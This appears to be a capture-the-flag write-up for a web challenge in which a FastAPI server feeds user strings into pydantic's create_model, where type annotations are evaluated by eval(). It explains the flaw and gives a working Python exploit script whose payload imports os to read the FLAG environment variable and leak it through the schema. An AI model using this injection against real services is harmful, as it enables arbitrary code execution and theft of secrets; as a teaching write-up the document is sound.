+++
title = "restaurant-builder"
date = 2026-06-26
authors = ["Vighnesh"]
+++

> So you want to build your own restaurant? Well, we obviously can't just let you do that. Please first submit blueprints and exact descriptions for the building, all the furniture and every single item you plan to have in the restaurant.
### Handout
[restaurant-builder.tar.gz](attachments/restaurant-builder.tar.gz)

---

Category: Web

We are given a FastAPI server in this which allows us to create and view pydantic models.  
Pydantic is a widely used library in python for data validation and parsing. It basically allows us to declare the format of our data first and validate that the passed data follows the rules.

#### GET /blueprint/{name} endpoint 

	returns the pydantic model in a json format.
#### POST /blueprint/{name}

	Allows us to pass a description of the pydantic model.  
The main vulnerability lies here. The string sent by us is passed directly to the create_model function with minimum validation (checks if the key does not start with ```__```)

Pydantic treats the value of each key as a forward-reference type annotation basically as a type hint. The string is passed through eval() basically allowing arbitrary code execution.

In this we had to recover the flag, so we have to make sure that the passed string is actually a type hint or else the schema is not accepted.   
Since typing was already imported I decided to use an Annotated str, making it a pydantic field with a description of  ```__import__('os').getenv('FLAG')```. The description just adds a field to the schema representation its not of use.

Upon querying the schema we can get the flag from ```['properties']['flag']['description']```

```
import requests
import json

BASE_URL = ""

blueprint_name = "awaa"

payload = {
    "flag": "__import__('typing').Annotated[str, __import__('pydantic').Field(description=__import__('os').getenv('FLAG'))]"
}

response = requests.post(f"{BASE_URL}/blueprint/{blueprint_name}", json=payload)

print(response.text)

response = requests.get(f"{BASE_URL}/blueprint/{blueprint_name}")

schema = response.json()

flag = schema['properties']['flag']['description']
print(flag)
```

